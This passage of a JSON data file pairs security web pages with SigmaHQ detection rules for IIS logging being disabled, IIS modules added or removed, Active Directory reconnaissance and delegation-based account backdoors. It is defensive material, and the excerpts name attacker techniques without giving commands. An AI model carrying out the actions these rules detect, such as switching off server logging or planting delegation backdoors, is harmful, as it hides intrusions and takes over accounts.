        "https://learn.microsoft.com/en-us/iis/manage/provisioning-and-managing-iis/configure-logging-in-iis",
        "https://www.microsoft.com/en-us/security/blog/2022/12/12/iis-modules-the-evolution-of-web-shells-and-how-to-detect-them/",
        "https://learn.microsoft.com/en-us/iis/configuration/system.webserver/httplogging"
      ],
      "author": "frack113",
      "date": "2024-10-06",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.002",
        "attack.t1505.004"
      ],
      "logsource": {
        "product": "windows",
        "service": "iis-configuration"
      },
      "detection": {
        "selection": {
          "EventID": 29,
          "Configuration": "/system.webServer/httpLogging/@dontLog",
          "NewValue": "true"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\iis-configuration\\win_iis_logging_http_disabled.yml"
  },
  "737": {
    "url": "https://www.microsoft.com/en-us/security/blog/2022/12/12/iis-modules-the-evolution-of-web-shells-and-how-to-detect-them/",
    "markdown": "# IIS modules: The evolution of web shells and how to detect them **December 12, 2022** --- The Microsoft Detection and Response Team (DART) has been renamed to Microsoft Incident Response (Microsoft IR). For more information on IR services, go to Microsoft Incident Response. Web exploitation and web shells are some of the most common entry points in the current threat landscape. Web servers provide an external avenue directly into your corporate network, which often results in web servers being an initial intrusion vector or mechanism of persistence. Monitoring for exploitation and web shells should be a high priority for",
    "sigma_rule": {
      "title": "HTTP Logging Disabled On IIS Server",
      "id": "e8ebd53a-30c2-45bd-81bb-74befba07bdb",
      "status": "experimental",
      "description": "Detects changes to of the IIS server configuration in order to disable HTTP logging for successful requests.",
      "references": [
        "https://learn.microsoft.com/en-us/iis/manage/provisioning-and-managing-iis/configure-logging-in-iis",
        "https://www.microsoft.com/en-us/security/blog/2022/12/12/iis-modules-the-evolution-of-web-shells-and-how-to-detect-them/",
        "https://learn.microsoft.com/en-us/iis/configuration/system.webserver/httplogging"
      ],
      "author": "frack113",
      "date": "2024-10-06",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.002",
        "attack.t1505.004"
      ],
      "logsource": {
        "product": "windows",
        "service": "iis-configuration"
      },
      "detection": {
        "selection": {
          "EventID": 29,
          "Configuration": "/system.webServer/httpLogging/@dontLog",
          "NewValue": "true"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\iis-configuration\\win_iis_logging_http_disabled.yml"
  },
  "738": {
    "url": "https://learn.microsoft.com/en-us/iis/configuration/system.webserver/httplogging",
    "markdown": "# HTTP Logging <httpLogging> ## Overview The `<httpLogging>` element allows you to configure IIS to generate log entries for only successful requests, failed requests, or both. After you configure logging for each Web site at the server level, you can use this element to enable selective logging for individual URLs. By default, HTTP logging is enabled for all requests on Internet Information Services (IIS) 7. You can view the log file for a site at any time to see which requests are failing and which requests are succeeding. When you no longer want IIS to log certain requests for a",
    "sigma_rule": {
      "title": "HTTP Logging Disabled On IIS Server",
      "id": "e8ebd53a-30c2-45bd-81bb-74befba07bdb",
      "status": "experimental",
      "description": "Detects changes to of the IIS server configuration in order to disable HTTP logging for successful requests.",
      "references": [
        "https://learn.microsoft.com/en-us/iis/manage/provisioning-and-managing-iis/configure-logging-in-iis",
        "https://www.microsoft.com/en-us/security/blog/2022/12/12/iis-modules-the-evolution-of-web-shells-and-how-to-detect-them/",
        "https://learn.microsoft.com/en-us/iis/configuration/system.webserver/httplogging"
      ],
      "author": "frack113",
      "date": "2024-10-06",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.002",
        "attack.t1505.004"
      ],
      "logsource": {
        "product": "windows",
        "service": "iis-configuration"
      },
      "detection": {
        "selection": {
          "EventID": 29,
          "Configuration": "/system.webServer/httpLogging/@dontLog",
          "NewValue": "true"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\iis-configuration\\win_iis_logging_http_disabled.yml"
  },
  "739": {
    "url": "https://learn.microsoft.com/en-us/iis/manage/provisioning-and-managing-iis/configure-logging-in-iis",
    "markdown": "# Configure Logging in IIS by Keith Newman and Robert McMurray You can configure logging on your web server or website that records information about HTTP requests and errors. The information in your log can help you troubleshoot or optimize your website. ## Prerequisites To get the most from this tutorial, you must have access to a computer that is running one of the following operating systems: - Windows Server® 2012 - Windows® 8 ## Configure Logging at the Site Level You can perform this procedure by using the user interface (UI), or by editing configuration files directly. ### To",
    "sigma_rule": {
      "title": "New Module Module Added To IIS Server",
      "id": "dd857d3e-0c6e-457b-9b48-e82ae7f86bd7",
      "status": "experimental",
      "description": "Detects the addition of a new module to an IIS server.",
      "references": [
        "https://learn.microsoft.com/en-us/iis/manage/provisioning-and-managing-iis/configure-logging-in-iis",
        "https://www.microsoft.com/en-us/security/blog/2022/12/12/iis-modules-the-evolution-of-web-shells-and-how-to-detect-them/",
        "https://www.microsoft.com/en-us/security/blog/2022/07/26/malicious-iis-extensions-quietly-open-persistent-backdoors-into-servers/",
        "https://learn.microsoft.com/en-us/iis/get-started/introduction-to-iis/iis-modules-overview"
      ],
      "author": "frack113",
      "date": "2024-10-06",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.t1562.002",
        "attack.t1505.004"
      ],
      "logsource": {
        "product": "windows",
        "service": "iis-configuration"
      },
      "detection": {
        "selection": {
          "EventID": 29,
          "Configuration|contains": "/system.webServer/modules/add"
        },
        "filter_main_builtin": {
          "NewValue": [
            "AnonymousAuthenticationModule",
            "CustomErrorModule",
            "DefaultDocumentModule",
            "DirectoryListingModule",
            "FileCacheModule",
            "HttpCacheModule",
            "HttpLoggingModule",
            "ProtocolSupportModule",
            "RequestFilteringModule",
            "StaticCompressionModule",
            "StaticFileModule",
            "TokenCacheModule",
            "UriCacheModule"
          ]
        },
        "filter_main_remove": {
          "NewValue": ""
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Legitimate administrator activity"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\iis-configuration\\win_iis_module_added.yml"
  },
  "740": {
    "url": "https://www.microsoft.com/en-us/security/blog/2022/12/12/iis-modules-the-evolution-of-web-shells-and-how-to-detect-them/",
    "markdown": "# IIS modules: The evolution of web shells and how to detect them **December 12, 2022** --- The Microsoft Detection and Response Team (DART) has been renamed to Microsoft Incident Response (Microsoft IR). For more information on IR services, go to Microsoft Incident Response. Web exploitation and web shells are some of the most common entry points in the current threat landscape. Web servers provide an external avenue directly into your corporate network, which often results in web servers being an initial intrusion vector or mechanism of persistence. Monitoring for exploitation and web shells should be a high priority for",
    "sigma_rule": {
      "title": "New Module Module Added To IIS Server",
      "id": "dd857d3e-0c6e-457b-9b48-e82ae7f86bd7",
      "status": "experimental",
      "description": "Detects the addition of a new module to an IIS server.",
      "references": [
        "https://learn.microsoft.com/en-us/iis/manage/provisioning-and-managing-iis/configure-logging-in-iis",
        "https://www.microsoft.com/en-us/security/blog/2022/12/12/iis-modules-the-evolution-of-web-shells-and-how-to-detect-them/",
        "https://www.microsoft.com/en-us/security/blog/2022/07/26/malicious-iis-extensions-quietly-open-persistent-backdoors-into-servers/",
        "https://learn.microsoft.com/en-us/iis/get-started/introduction-to-iis/iis-modules-overview"
      ],
      "author": "frack113",
      "date": "2024-10-06",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.t1562.002",
        "attack.t1505.004"
      ],
      "logsource": {
        "product": "windows",
        "service": "iis-configuration"
      },
      "detection": {
        "selection": {
          "EventID": 29,
          "Configuration|contains": "/system.webServer/modules/add"
        },
        "filter_main_builtin": {
          "NewValue": [
            "AnonymousAuthenticationModule",
            "CustomErrorModule",
            "DefaultDocumentModule",
            "DirectoryListingModule",
            "FileCacheModule",
            "HttpCacheModule",
            "HttpLoggingModule",
            "ProtocolSupportModule",
            "RequestFilteringModule",
            "StaticCompressionModule",
            "StaticFileModule",
            "TokenCacheModule",
            "UriCacheModule"
          ]
        },
        "filter_main_remove": {
          "NewValue": ""
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Legitimate administrator activity"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\iis-configuration\\win_iis_module_added.yml"
  },
  "741": {
    "url": "https://www.microsoft.com/en-us/security/blog/2022/07/26/malicious-iis-extensions-quietly-open-persistent-backdoors-into-servers/",
    "markdown": "# Malicious IIS extensions quietly open persistent backdoors into servers **Published on July 26, 2022** --- Attackers are increasingly leveraging Internet Information Services (IIS) extensions as covert backdoors into servers, which hide deep in target environments and provide a durable persistence mechanism for attackers. While prior research has been published on specific incidents and variants, little is generally known about how attackers leverage the IIS platform as a backdoor. Malicious IIS extensions are less frequently encountered in attacks against servers, with attackers often only using script web shells as the first stage payload. This leads to a relatively lower detection",
    "sigma_rule": {
      "title": "New Module Module Added To IIS Server",
      "id": "dd857d3e-0c6e-457b-9b48-e82ae7f86bd7",
      "status": "experimental",
      "description": "Detects the addition of a new module to an IIS server.",
      "references": [
        "https://learn.microsoft.com/en-us/iis/manage/provisioning-and-managing-iis/configure-logging-in-iis",
        "https://www.microsoft.com/en-us/security/blog/2022/12/12/iis-modules-the-evolution-of-web-shells-and-how-to-detect-them/",
        "https://www.microsoft.com/en-us/security/blog/2022/07/26/malicious-iis-extensions-quietly-open-persistent-backdoors-into-servers/",
        "https://learn.microsoft.com/en-us/iis/get-started/introduction-to-iis/iis-modules-overview"
      ],
      "author": "frack113",
      "date": "2024-10-06",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.t1562.002",
        "attack.t1505.004"
      ],
      "logsource": {
        "product": "windows",
        "service": "iis-configuration"
      },
      "detection": {
        "selection": {
          "EventID": 29,
          "Configuration|contains": "/system.webServer/modules/add"
        },
        "filter_main_builtin": {
          "NewValue": [
            "AnonymousAuthenticationModule",
            "CustomErrorModule",
            "DefaultDocumentModule",
            "DirectoryListingModule",
            "FileCacheModule",
            "HttpCacheModule",
            "HttpLoggingModule",
            "ProtocolSupportModule",
            "RequestFilteringModule",
            "StaticCompressionModule",
            "StaticFileModule",
            "TokenCacheModule",
            "UriCacheModule"
          ]
        },
        "filter_main_remove": {
          "NewValue": ""
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Legitimate administrator activity"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\iis-configuration\\win_iis_module_added.yml"
  },
  "742": {
    "url": "https://learn.microsoft.com/en-us/iis/get-started/introduction-to-iis/iis-modules-overview",
    "markdown": "# IIS Modules Overview by IIS Team, Mike Volodarsky ## Compatibility | Version | Notes | | ------------------- | --------------------------------------------------------------------------- | | IIS 7.0 and later | The features described in this article were introduced in IIS 7.0. | | IIS 6.0 and earlier | The features described in this article were not supported prior to IIS 7.0. | ## Introduction The IIS 7 and above Web server feature set is componentized into more than thirty independent modules. A module is either a Win32 DLL (native module) or a .NET 2.0 type contained within an assembly (managed module). Similar to",
    "sigma_rule": {
      "title": "New Module Module Added To IIS Server",
      "id": "dd857d3e-0c6e-457b-9b48-e82ae7f86bd7",
      "status": "experimental",
      "description": "Detects the addition of a new module to an IIS server.",
      "references": [
        "https://learn.microsoft.com/en-us/iis/manage/provisioning-and-managing-iis/configure-logging-in-iis",
        "https://www.microsoft.com/en-us/security/blog/2022/12/12/iis-modules-the-evolution-of-web-shells-and-how-to-detect-them/",
        "https://www.microsoft.com/en-us/security/blog/2022/07/26/malicious-iis-extensions-quietly-open-persistent-backdoors-into-servers/",
        "https://learn.microsoft.com/en-us/iis/get-started/introduction-to-iis/iis-modules-overview"
      ],
      "author": "frack113",
      "date": "2024-10-06",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.t1562.002",
        "attack.t1505.004"
      ],
      "logsource": {
        "product": "windows",
        "service": "iis-configuration"
      },
      "detection": {
        "selection": {
          "EventID": 29,
          "Configuration|contains": "/system.webServer/modules/add"
        },
        "filter_main_builtin": {
          "NewValue": [
            "AnonymousAuthenticationModule",
            "CustomErrorModule",
            "DefaultDocumentModule",
            "DirectoryListingModule",
            "FileCacheModule",
            "HttpCacheModule",
            "HttpLoggingModule",
            "ProtocolSupportModule",
            "RequestFilteringModule",
            "StaticCompressionModule",
            "StaticFileModule",
            "TokenCacheModule",
            "UriCacheModule"
          ]
        },
        "filter_main_remove": {
          "NewValue": ""
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Legitimate administrator activity"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\iis-configuration\\win_iis_module_added.yml"
  },
  "743": {
    "url": "https://learn.microsoft.com/en-us/iis/manage/provisioning-and-managing-iis/configure-logging-in-iis",
    "markdown": "# Configure Logging in IIS by Keith Newman and Robert McMurray You can configure logging on your web server or website that records information about HTTP requests and errors. The information in your log can help you troubleshoot or optimize your website. ## Prerequisites To get the most from this tutorial, you must have access to a computer that is running one of the following operating systems: - Windows Server® 2012 - Windows® 8 ## Configure Logging at the Site Level You can perform this procedure by using the user interface (UI), or by editing configuration files directly. ### To",
    "sigma_rule": {
      "title": "Previously Installed IIS Module Was Removed",
      "id": "9e1a1fdf-ee58-40ce-8e15-b66ca5a80e1f",
      "status": "experimental",
      "description": "Detects the removal of a previously installed IIS module.",
      "references": [
        "https://learn.microsoft.com/en-us/iis/manage/provisioning-and-managing-iis/configure-logging-in-iis",
        "https://www.microsoft.com/en-us/security/blog/2022/12/12/iis-modules-the-evolution-of-web-shells-and-how-to-detect-them/",
        "https://www.microsoft.com/en-us/security/blog/2022/07/26/malicious-iis-extensions-quietly-open-persistent-backdoors-into-servers/",
        "https://learn.microsoft.com/en-us/iis/get-started/introduction-to-iis/iis-modules-overview"
      ],
      "author": "Nasreddine Bencherchali",
      "date": "2024-10-06",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.t1562.002",
        "attack.t1505.004"
      ],
      "logsource": {
        "product": "windows",
        "service": "iis-configuration"
      },
      "detection": {
        "selection": {
          "EventID": 29,
          "Configuration|contains": "/system.webServer/modules/remove"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate administrator activity"
      ],
      "level": "low"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\iis-configuration\\win_iis_module_removed.yml"
  },
  "744": {
    "url": "https://www.microsoft.com/en-us/security/blog/2022/12/12/iis-modules-the-evolution-of-web-shells-and-how-to-detect-them/",
    "markdown": "# IIS modules: The evolution of web shells and how to detect them **December 12, 2022** --- The Microsoft Detection and Response Team (DART) has been renamed to Microsoft Incident Response (Microsoft IR). For more information on IR services, go to Microsoft Incident Response. Web exploitation and web shells are some of the most common entry points in the current threat landscape. Web servers provide an external avenue directly into your corporate network, which often results in web servers being an initial intrusion vector or mechanism of persistence. Monitoring for exploitation and web shells should be a high priority for",
    "sigma_rule": {
      "title": "Previously Installed IIS Module Was Removed",
      "id": "9e1a1fdf-ee58-40ce-8e15-b66ca5a80e1f",
      "status": "experimental",
      "description": "Detects the removal of a previously installed IIS module.",
      "references": [
        "https://learn.microsoft.com/en-us/iis/manage/provisioning-and-managing-iis/configure-logging-in-iis",
        "https://www.microsoft.com/en-us/security/blog/2022/12/12/iis-modules-the-evolution-of-web-shells-and-how-to-detect-them/",
        "https://www.microsoft.com/en-us/security/blog/2022/07/26/malicious-iis-extensions-quietly-open-persistent-backdoors-into-servers/",
        "https://learn.microsoft.com/en-us/iis/get-started/introduction-to-iis/iis-modules-overview"
      ],
      "author": "Nasreddine Bencherchali",
      "date": "2024-10-06",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.t1562.002",
        "attack.t1505.004"
      ],
      "logsource": {
        "product": "windows",
        "service": "iis-configuration"
      },
      "detection": {
        "selection": {
          "EventID": 29,
          "Configuration|contains": "/system.webServer/modules/remove"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate administrator activity"
      ],
      "level": "low"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\iis-configuration\\win_iis_module_removed.yml"
  },
  "745": {
    "url": "https://www.microsoft.com/en-us/security/blog/2022/07/26/malicious-iis-extensions-quietly-open-persistent-backdoors-into-servers/",
    "markdown": "# Malicious IIS extensions quietly open persistent backdoors into servers **Published on July 26, 2022** --- Attackers are increasingly leveraging Internet Information Services (IIS) extensions as covert backdoors into servers, which hide deep in target environments and provide a durable persistence mechanism for attackers. While prior research has been published on specific incidents and variants, little is generally known about how attackers leverage the IIS platform as a backdoor. Malicious IIS extensions are less frequently encountered in attacks against servers, with attackers often only using script web shells as the first stage payload. This leads to a relatively lower detection",
    "sigma_rule": {
      "title": "Previously Installed IIS Module Was Removed",
      "id": "9e1a1fdf-ee58-40ce-8e15-b66ca5a80e1f",
      "status": "experimental",
      "description": "Detects the removal of a previously installed IIS module.",
      "references": [
        "https://learn.microsoft.com/en-us/iis/manage/provisioning-and-managing-iis/configure-logging-in-iis",
        "https://www.microsoft.com/en-us/security/blog/2022/12/12/iis-modules-the-evolution-of-web-shells-and-how-to-detect-them/",
        "https://www.microsoft.com/en-us/security/blog/2022/07/26/malicious-iis-extensions-quietly-open-persistent-backdoors-into-servers/",
        "https://learn.microsoft.com/en-us/iis/get-started/introduction-to-iis/iis-modules-overview"
      ],
      "author": "Nasreddine Bencherchali",
      "date": "2024-10-06",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.t1562.002",
        "attack.t1505.004"
      ],
      "logsource": {
        "product": "windows",
        "service": "iis-configuration"
      },
      "detection": {
        "selection": {
          "EventID": 29,
          "Configuration|contains": "/system.webServer/modules/remove"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate administrator activity"
      ],
      "level": "low"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\iis-configuration\\win_iis_module_removed.yml"
  },
  "746": {
    "url": "https://learn.microsoft.com/en-us/iis/get-started/introduction-to-iis/iis-modules-overview",
    "markdown": "# IIS Modules Overview by IIS Team, Mike Volodarsky ## Compatibility | Version | Notes | | ------------------- | --------------------------------------------------------------------------- | | IIS 7.0 and later | The features described in this article were introduced in IIS 7.0. | | IIS 6.0 and earlier | The features described in this article were not supported prior to IIS 7.0. | ## Introduction The IIS 7 and above Web server feature set is componentized into more than thirty independent modules. A module is either a Win32 DLL (native module) or a .NET 2.0 type contained within an assembly (managed module). Similar to",
    "sigma_rule": {
      "title": "Previously Installed IIS Module Was Removed",
      "id": "9e1a1fdf-ee58-40ce-8e15-b66ca5a80e1f",
      "status": "experimental",
      "description": "Detects the removal of a previously installed IIS module.",
      "references": [
        "https://learn.microsoft.com/en-us/iis/manage/provisioning-and-managing-iis/configure-logging-in-iis",
        "https://www.microsoft.com/en-us/security/blog/2022/12/12/iis-modules-the-evolution-of-web-shells-and-how-to-detect-them/",
        "https://www.microsoft.com/en-us/security/blog/2022/07/26/malicious-iis-extensions-quietly-open-persistent-backdoors-into-servers/",
        "https://learn.microsoft.com/en-us/iis/get-started/introduction-to-iis/iis-modules-overview"
      ],
      "author": "Nasreddine Bencherchali",
      "date": "2024-10-06",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.t1562.002",
        "attack.t1505.004"
      ],
      "logsource": {
        "product": "windows",
        "service": "iis-configuration"
      },
      "detection": {
        "selection": {
          "EventID": 29,
          "Configuration|contains": "/system.webServer/modules/remove"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate administrator activity"
      ],
      "level": "low"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\iis-configuration\\win_iis_module_removed.yml"
  },
  "747": {
    "url": "https://web.archive.org/web/20230329163438/https://blog.menasec.net/2019/02/threat-hunting-5-detecting-enumeration.html",
    "markdown": "# Threat Hunting #5 - Detecting enumeration of users via Net.exe or Net1.exe utility Detecting an attacker during the reconnaissance phase is very important, because if he/she is at this stage, it means she/he already bypassed all your peripheral and endpoint standard security solutions. If you can detect and stop him at this stage then good for you! Microsoft Net.exe utility can be used to enumerate local and domain users and groups [a must to do for any attacker trying to get answers for who/where/what/etc. to complete the objectives]. Famous detection techniques for users enumeration with the net.exe utility are",
    "sigma_rule": {
      "title": "AD Privileged Users or Groups Reconnaissance",
      "id": "35ba1d85-724d-42a3-889f-2e2362bcaf23",
      "status": "test",
      "description": "Detect priv users or groups recon based on 4661 eventid and known privileged users or groups SIDs",
      "references": [
        "https://web.archive.org/web/20230329163438/https://blog.menasec.net/2019/02/threat-hunting-5-detecting-enumeration.html"
      ],
      "author": "Samir Bousseaden",
      "date": "2019-04-03",
      "modified": "2022-07-13",
      "tags": [
        "attack.discovery",
        "attack.t1087.002"
      ],
      "logsource": {
        "product": "windows",
        "service": "security",
        "definition": "Requirements: enable Object Access SAM on your Domain Controllers"
      },
      "detection": {
        "selection": {
          "EventID": 4661,
          "ObjectType": [
            "SAM_USER",
            "SAM_GROUP"
          ]
        },
        "selection_object": [
          {
            "ObjectName|endswith": [
              "-512",
              "-502",
              "-500",
              "-505",
              "-519",
              "-520",
              "-544",
              "-551",
              "-555"
            ]
          },
          {
            "ObjectName|contains": "admin"
          }
        ],
        "filter": {
          "SubjectUserName|endswith": "$"
        },
        "condition": "selection and selection_object and not filter"
      },
      "falsepositives": [
        "If source account name is not an admin then its super suspicious"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_account_discovery.yml"
  },
  "748": {
    "url": "https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada2/86261ca1-154c-41fb-8e5f-c6446e77daaa",
    "markdown": "# 2.219 Attribute msDS-AllowedToDelegateTo For a given computer or user account, this attribute specifies the list of service principal names (SPN) corresponding to Windows services that can act on behalf of the computer or user account. ``` cn: ms-DS-Allowed-To-Delegate-To ldapDisplayName: msDS-AllowedToDelegateTo attributeId: 1.2.840.113556.1.4.1787 attributeSyntax: 2.5.5.12 omSyntax: 64 isSingleValued: FALSE schemaIdGuid: 800d94d7-b7a1-42a1-b14d-7cae1423d07f systemOnly: FALSE searchFlags: 0 attributeSecurityGuid: e48d0154-bcf8-11d1-8702-00c04fb96050 systemFlags: FLAG_SCHEMA_BASE_OBJECT schemaFlagsEx: FLAG_ATTR_IS_CRITICAL ``` Version-Specific Behavior: First implemented on Windows Server 2003 operating system. The schemaFlagsEx attribute was added to this attribute definition in Windows Server 2008 operating system.",
    "sigma_rule": {
      "title": "Active Directory User Backdoors",
      "id": "300bac00-e041-4ee2-9c36-e262656a6ecc",
      "status": "test",
      "description": "Detects scenarios where one can control another users or computers account without having to use their credentials.",
      "references": [
        "https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada2/86261ca1-154c-41fb-8e5f-c6446e77daaa",
        "https://adsecurity.org/?p=3466",
        "https://blog.harmj0y.net/redteaming/another-word-on-delegation/"
      ],
      "author": "@neu5ron",
      "date": "2017-04-13",
      "modified": "2024-02-26",
      "tags": [
        "attack.t1098",
        "attack.persistence"
      ],
      "logsource": {
        "product": "windows",
        "service": "security",
        "definition": "Requirements: Audit Policy : Account Management > Audit User Account Management, Group Policy : Computer Configuration\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\Account Management\\Audit User Account Management, DS Access > Audit Directory Service Changes, Group Policy : Computer Configuration\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\DS Access\\Audit Directory Service Changes"
      },
      "detection": {
        "selection1": {
          "EventID": 4738
        },
        "filter_empty": {
          "AllowedToDelegateTo": [
            "",
            "-"
          ]
        },
        "filter_null": {
          "AllowedToDelegateTo": null
        },
        "selection_5136_1": {
          "EventID": 5136,
          "AttributeLDAPDisplayName": "msDS-AllowedToDelegateTo"
        },
        "selection_5136_2": {
          "EventID": 5136,
          "ObjectClass": "user",
          "AttributeLDAPDisplayName": "servicePrincipalName"
        },
        "selection_5136_3": {
          "EventID": 5136,
          "AttributeLDAPDisplayName": "msDS-AllowedToActOnBehalfOfOtherIdentity"
        },
        "condition": "(selection1 and not 1 of filter_*) or 1 of selection_5136_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_alert_ad_user_backdoors.yml"
  },
  "749": {
    "url": "https://adsecurity.org/?p=3466",
    "markdown": "# Sneaky Persistence Active Directory Trick #18: Dropping SPNs on Admin Accounts for Later Kerberoasting *January 29, 2017* *Categories: ActiveDirectorySecurity, Microsoft Security, Technical Reference* The content in this post describes a method through which an attacker could persist administrative access to Active Directory after having Domain Admin level rights for about 5 minutes. Complete list of Sneaky Active Directory Persistence Tricks posts This post explores how an attacker could leverage existing admin rights and/or over-permissive delegation to gain persistence on an admin account or accounts. Any account with a Service Principal Name can be Kerberoasted. It’s possible with the appropriate",
    "sigma_rule": {
      "title": "Active Directory User Backdoors",
      "id": "300bac00-e041-4ee2-9c36-e262656a6ecc",
      "status": "test",
      "description": "Detects scenarios where one can control another users or computers account without having to use their credentials.",
      "references": [
        "https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada2/86261ca1-154c-41fb-8e5f-c6446e77daaa",
        "https://adsecurity.org/?p=3466",
        "https://blog.harmj0y.net/redteaming/another-word-on-delegation/"
      ],
      "author": "@neu5ron",
      "date": "2017-04-13",
      "modified": "2024-02-26",
      "tags": [
        "attack.t1098",
        "attack.persistence"
      ],
      "logsource": {
        "product": "windows",
        "service": "security",
        "definition": "Requirements: Audit Policy : Account Management > Audit User Account Management, Group Policy : Computer Configuration\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\Account Management\\Audit User Account Management, DS Access > Audit Directory Service Changes, Group Policy : Computer Configuration\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\DS Access\\Audit Directory Service Changes"
      },
      "detection": {
        "selection1": {
          "EventID": 4738
        },
        "filter_empty": {
          "AllowedToDelegateTo": [
            "",
            "-"
          ]
        },
        "filter_null": {
          "AllowedToDelegateTo": null
        },
        "selection_5136_1": {
          "EventID": 5136,
          "AttributeLDAPDisplayName": "msDS-AllowedToDelegateTo"
        },
        "selection_5136_2": {
          "EventID": 5136,
          "ObjectClass": "user",
          "AttributeLDAPDisplayName": "servicePrincipalName"
        },
        "selection_5136_3": {
          "EventID": 5136,
          "AttributeLDAPDisplayName": "msDS-AllowedToActOnBehalfOfOtherIdentity"
        },
        "condition": "(selection1 and not 1 of filter_*) or 1 of selection_5136_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_alert_ad_user_backdoors.yml"
  },
  "750": {
    "url": "https://blog.harmj0y.net/redteaming/another-word-on-delegation/",
    "markdown": "# Another Word on Delegation **3 Comments** / **Red Teaming** / **Published on October 25, 2018** Every time I think I start to understand Active Directory and Kerberos, a new topic pops up to mess with my head. A few weeks ago, @elad_shamir contacted @tifkin_ and myself with some ideas about resource-based Kerberos constrained delegation. Thanks to Elad’s ideas, the great back and forth, and his awesome pull request to Rubeus, we now understand this attack vector and have a tool to abuse it. We also now have something @_wald0, @cptjesus, and I have wanted for a long while- an",
    "sigma_rule": {
      "title": "Active Directory User Backdoors",
      "id": "300bac00-e041-4ee2-9c36-e262656a6ecc",
      "status": "test",
      "description": "Detects scenarios where one can control another users or computers account without having to use their credentials.",
      "references": [
        "https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada2/86261ca1-154c-41fb-8e5f-c6446e77daaa",
        "https://adsecurity.org/?p=3466",
        "https://blog.harmj0y.net/redteaming/another-word-on-delegation/"
      ],
      "author": "@neu5ron",
      "date": "2017-04-13",
      "modified": "2024-02-26",
      "tags": [
        "attack.t1098",
        "attack.persistence"
      ],
      "logsource": {
        "product": "windows",
        "service": "security",
        "definition": "Requirements: Audit Policy : Account Management > Audit User Account Management, Group Policy : Computer Configuration\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\Account Management\\Audit User Account Management, DS Access > Audit Directory Service Changes, Group Policy : Computer Configuration\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\DS Access\\Audit Directory Service Changes"
      },
      "detection": {
        "selection1": {
          "EventID": 4738
        },
        "filter_empty": {
          "AllowedToDelegateTo": [
            "",
            "-"
          ]
        },
        "filter_null": {
          "AllowedToDelegateTo": null
        },
        "selection_5136_1": {
          "EventID": 5136,
          "AttributeLDAPDisplayName": "msDS-AllowedToDelegateTo"
        },
        "selection_5136_2": {
          "EventID": 5136,
          "ObjectClass": "user",
          "AttributeLDAPDisplayName": "servicePrincipalName"
        },
        "selection_5136_3": {
          "EventID": 5136,
          "AttributeLDAPDisplayName": "msDS-AllowedToActOnBehalfOfOtherIdentity"
        },
        "condition": "(selection1 and not 1 of filter_*) or 1 of selection_5136_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\win_security_alert_ad_user_backdoors.yml"
  },
  "751": {
    "url": "https://adsecurity.org/?p=2053",
